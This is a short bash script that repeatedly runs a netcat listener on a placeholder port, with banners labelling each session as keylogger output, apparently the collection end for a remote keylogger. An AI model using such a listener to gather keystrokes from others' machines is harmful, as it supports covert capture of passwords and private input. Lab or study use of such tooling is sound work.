#!/bin/bash

PORT=<PORT>

trap "echo 'Caught SIGINT, exiting...'; exit 0" SIGINT

while true
do
    echo -e '\n  KEYLOGGER START'
    echo -e '===================='
    nc -lvnp $PORT
    echo -e '\n KEYLOGGER END'
    echo -e '===================\n'
done